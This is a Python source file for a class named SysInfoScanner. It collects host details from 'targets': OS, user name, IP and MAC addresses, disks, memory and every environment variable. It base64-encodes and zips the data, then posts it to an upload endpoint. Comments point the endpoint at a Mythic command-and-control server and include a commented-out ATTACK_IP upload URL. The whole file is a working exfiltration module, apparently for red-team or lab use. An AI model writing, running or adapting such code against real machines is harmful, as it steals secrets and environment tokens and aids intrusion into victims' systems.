'''
 # @ Create Time: 2025-04-10 12:41:15
 # @ Modified time: 2025-04-14 11:26:44
 # @ Description: class to collect system information from targets
 '''



import platform
import socket
import psutil
import os
import uuid
import getpass
import base64
import zipfile
import tempfile
import json
import requests
from pathlib import Path
from dotenv import load_dotenv

# load .env for sensitive tokens
load_dotenv()

class SysInfoScanner:
    def __init__(self, save_location: Path):
        self.save_location = save_location

    def os_info(self):
        return {
            "OS": platform.system(),
            "OS Version": platform.version(),
            "Release": platform.release()
        }

    def mach_proc_info(self):
        return {
            "Machine": platform.machine(),
            "Processor": platform.processor(),
            "Architecture": platform.architecture(),
        }

    def user_info(self):
        return {
            "User": getpass.getuser()
        }

    def network_info(self):
        return {
            "IP Address": socket.gethostbyname(socket.gethostname()),
            "MAC Address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                                    for elements in range(0,2*6,2)][::-1])
        }

    def disk_info(self):
        disk_info = psutil.disk_partitions()
        return {
            "Disk Partitions": [{"device": d.device, "mountpoint": d.mountpoint,
                                 "fstype": d.fstype}
                                for d in disk_info]
        }

    def mem_info(self):
        virtual_mem = psutil.virtual_memory()
        return {
            "Total Memory": virtual_mem.total,
            "Available Memory": virtual_mem.available
        }

    def env_info(self):
        return {
            "Environment Variables": dict(os.environ)
        }

    def _encode(self, info: dict):
        info_str = json.dumps(info)
        encoded_bytes = base64.b64encode(info_str.encode('utf-8'))
        return encoded_bytes.decode('utf-8')

    def _compress(self, encoded_info, filename):
        save_path = self.save_location / filename
        with zipfile.ZipFile(save_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.writestr("systeminfo.txt", encoded_info)
        return save_path

    def collect_and_send(self, upload_url: str):
        # gather system info
        system_info = {}
        system_info.update(self.os_info())
        system_info.update(self.mach_proc_info())
        system_info.update(self.user_info())
        system_info.update(self.network_info())
        system_info.update(self.disk_info())
        system_info.update(self.mem_info())
        system_info.update(self.env_info())

        encoded = self._encode(system_info)
        zip_path = self._compress(encoded, "info.zip")

        files = {'file': open(zip_path, 'rb')}
        try:
            print(f"[+] Sending data to {upload_url}")
            r = requests.post(upload_url, files=files)
            print("[+] Response:", r.status_code, r.text)
        except Exception as e:
            print("[-] Failed to send:", e)

if __name__ == "__main__":
    temp_dir = Path(tempfile.gettempdir())
    scanner = SysInfoScanner(temp_dir)

    # replace with your Mythic server's IP or domain name and port
    # remote_upload_url = f"http://{os.getenv('ATTACK_IP')}:8000/upload"
    remote_upload_url = f"http://127.0.0.1:8000/upload"
    scanner.collect_and_send(remote_upload_url)
